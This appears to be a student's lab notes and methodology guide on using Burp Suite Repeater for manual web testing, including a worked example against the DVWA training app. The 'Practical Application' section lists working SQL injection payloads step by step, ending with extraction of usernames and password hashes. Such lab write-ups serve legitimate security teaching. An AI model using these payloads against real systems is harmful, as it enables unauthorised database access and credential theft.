# Burp Suite Repeater: Methodology Guide

> **Precise HTTP Request Manipulation for Manual Exploitation**

---

## What Is Repeater?

Burp Suite Repeater is a manual HTTP request tool that allows security testers to:
- Capture any HTTP/HTTPS request
- Modify any part of it (URL, headers, body, cookies)
- Resend it to the server as many times as needed
- Compare responses side by side

**Core value:** Eliminates the limitations of the browser as an attack tool.

---

## Why Repeater Instead of the Browser

### Browser Limitations for Manual SQLi

```
Problem 1: URL encoding interference
  Browser sends: ' → %27 (encoded)
  Application receives: %27 (may not trigger injection)
  Repeater sends: ' exactly as written

Problem 2: Session state management
  Browser may lose cookies between requests
  Repeater preserves all headers and cookies automatically

Problem 3: No injection into headers
  Browser cannot easily modify User-Agent, Referer, X-Forwarded-For
  Repeater exposes every single header for modification

Problem 4: No request history
  Browser does not track which payload produced which response
  Repeater maintains numbered history (1, 2, 3...) for comparison

Problem 5: Browser restrictions
  Some characters trigger browser warnings or are filtered
  Repeater sends raw bytes — no restrictions
```

### Repeater Advantages

```
✓ Raw HTTP: Sends exactly what you write, nothing more
✓ Header injection: Modify any header (Cookie, User-Agent, Referer, X-Forwarded-For)
✓ History: Every request numbered and preserved
✓ Side-by-side: Compare responses to find behavioral differences
✓ No encoding: Special characters sent as-is
✓ Session preserved: Cookie automatically maintained
✓ Speed: No browser rendering, no page reload overhead
```

---

## Core Workflow

### Step 1: Intercept Request in Proxy

```
1. Open Burp Suite
2. Proxy → Intercept → Turn Intercept ON
3. Configure browser to proxy through 127.0.0.1:8080
4. In browser: Submit a normal request (e.g., search for a product)
5. Request appears in Burp Proxy → Intercept tab
```

### Step 2: Send to Repeater

```
In Proxy → Intercept:
  Right-click anywhere in the request
  → "Send to Repeater"
  
Or keyboard shortcut: Ctrl+R
```

### Step 3: Modify and Send

```
In Repeater tab:
  Left panel: Edit the raw request
  Click "Send"
  Right panel: Server response appears
```

### Step 4: Iterate

```
Modify payload → Send → Observe response → Modify again
Each send creates a numbered entry in history
Compare: response 1 vs response 5 to identify behavioral differences
```

---

## Anatomy of the Repeater Interface

### Anatomy of the Repeater Interface

```text
┌─────────────────────────────────────────────────────────────┐
│  History: 1  2  3  4  5  [current]                          │
├─────────────────────────┬───────────────────────────────────┤
│  REQUEST (editable)     │  RESPONSE (read-only)             │
│                         │                                   │
│  GET /filter?id=1 HTTP  │  HTTP/2 200 OK                    │
│  Host: target.com       │  Content-Type: text/html          │
│  Cookie: session=abc    │                                   │
│  ...                    │  <html>                           │
│  [EDIT HERE]            │  <p>First Name: admin</p>         │
│                         │  <p>Surname: password123</p>      │
│  [Send]                 │                                   │
└─────────────────────────┴───────────────────────────────────┘
```

---

## Message Analysis Toolbar

Located above the request/response panels:

```
| Button | Function | When to Use |
| :--- | :--- | :--- |
| **Pretty** | Format HTML/JSON for readability | Analyzing structured response bodies |
| **Raw** | Show unformatted bytes | Finding hidden characters, exact byte matching |
| **Hex** | Show hexadecimal view | Binary data, encoding analysis |
| **Render** | Show rendered HTML page | See how injected data appears visually |

---

## Inspector Panel

The Inspector provides a structured breakdown of the request without editing the raw text:

```
Inspector sections:
├── Request Attributes
│   ├── Method (GET/POST)
│   ├── Path
│   └── HTTP version
├── Query Parameters
│   └── [parameter name]: [value] ← Edit individual params here
├── Request Headers
│   └── Each header editable individually
├── Request Body
│   └── POST body parameters
└── Cookies
    └── Session tokens, tracking cookies
```

**When to use Inspector:** When the raw request is complex and you only want to change one specific parameter without risking accidental modification of surrounding text.

---

## Practical Application: SQLi via Repeater

### Intercepting the DVWA Request

```http
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.x.x
Cookie: PHPSESSID=abc123; security=low
```

This request is sent to Repeater. From here, every payload iteration is done by modifying the `id` parameter directly.

### Payload Iteration in Repeater

**Send 1: Baseline**
```http
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
→ Response: "First Name: admin, Surname: admin"
```

**Send 2: Injection probe**
```http
GET /dvwa/vulnerabilities/sqli/?id='&Submit=Submit
→ Response: "MariaDB syntax error..." ← Injection confirmed
```

**Send 3: Column count test**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' ORDER BY 2 -- -&Submit=Submit
→ Response: Normal ← 2+ columns exist
```

**Send 4: Column count boundary**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' ORDER BY 3 -- -&Submit=Submit
→ Response: "Unknown column '3'" ← Exactly 2 columns
```

**Send 5: UNION test**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1, 2 -- -&Submit=Submit
→ Response: Shows "1" and "2" ← Both columns output to page
```

**Send 6: DB recon**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT database(), user() -- -&Submit=Submit
→ Response: "dvwa / app@localhost"
```

**Send 7: Table enumeration**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa' -- -&Submit=Submit
→ Response: guestbook, users
```

**Send 8: Column enumeration**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' -- -&Submit=Submit
→ Response: user_id, first_name, last_name, user, password...
```

**Send 9: Credential extraction**
```http
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user, password FROM users -- -&Submit=Submit
→ Response: admin:5f4dcc3b5aa765d61d8327deb882cf99 (and 4 more)
```

**Repeater history preserved:** All 9 sends are numbered and accessible for comparison at any point.

---

## Task 6 and 7 Findings

### Task 6: Practical Example

**Vulnerability discovered:** Input validation vulnerability — user-supplied parameter passed directly to backend application logic without sanitization.

**Approach:**
1. Intercepted HTTP POST request containing vulnerable parameter
2. Sent to Repeater
3. Modified target parameter to manipulate backend logic
4. Observed application response change → vulnerability confirmed

**Key technique:** Modifying headers alongside parameter values — Burp Repeater enabled simultaneous modification of HTTP headers (Cookie, User-Agent) and body parameters that the browser does not expose.

### Task 7: Challenge

**Result:** Successfully solved. Flags captured via parameter manipulation inside Repeater.

**Approach:** Systematically tested edge cases by modifying the request iteratively — approach that would have been impractical via browser alone due to encoding and state issues.

### Task 8: Extra-Mile Challenge

**Completed:** Yes.

**Approach:** Analyzed how the application handles unexpected and out-of-bound inputs beyond the obvious vulnerable parameter. Burp Repeater was essential here — it preserved the full request context while enabling systematic modification of individual components, making it possible to observe subtle behavioral differences that would be impossible to reproduce reliably through a browser.

---

## Repeater vs Other Burp Tools

| Tool | Purpose | When to Use |
| :--- | :--- | :--- |
| **Proxy** | Intercept live traffic | Initial capture, session management |
| **Repeater** | Manual iteration of single request | Exploit development, payload tuning |
| **Intruder** | Automated payload fuzzing | Brute force, parameter scanning |
| **Scanner** | Automated vulnerability detection | Broad reconnaissance |
| **Decoder** | Encode/decode data | URL encoding, Base64, hashing |
| **Comparer** | Diff two responses | Blind SQLi response comparison |

**This week's workflow:** Proxy (capture) → Repeater (exploit development)

---

## Efficiency Techniques

### Keyboard Shortcuts

```
Ctrl+R       Send request to Repeater
Ctrl+Shift+R Send response to Repeater
Ctrl+Enter   Send request (in Repeater)
Ctrl+Z       Undo last edit in request
```

### Response Comparison for Blind SQLi

When TRUE and FALSE payloads both return HTTP 200, use Comparer:

```
1. Send TRUE payload → Response 1
2. Send FALSE payload → Response 2
3. Right-click Response 1 → "Send to Comparer"
4. Right-click Response 2 → "Send to Comparer"
5. Comparer → Compare responses
6. Highlight shows exactly what differs
```

This reveals subtle differences (extra whitespace, different content length, hidden elements) that indicate a boolean TRUE/FALSE distinction.

---

## Real-World Significance

Burp Suite Repeater is the standard tool for:
- Manual payload development during penetration tests
- Bypassing WAFs (iterating payload variations)
- Finding injection points in non-standard parameters (headers, cookies)
- Reproducing reported vulnerabilities for client demonstrations
- Confirming automated scanner findings manually

Every professional Red Team report that includes a web application finding should include a Burp Repeater screenshot as proof of manual exploitation — it demonstrates that the finding is real and not a false positive from an automated scanner.

---

**Status:** Week 7 Burp Repeater | Methodology Documented | Ready for Advanced Web Exploitation
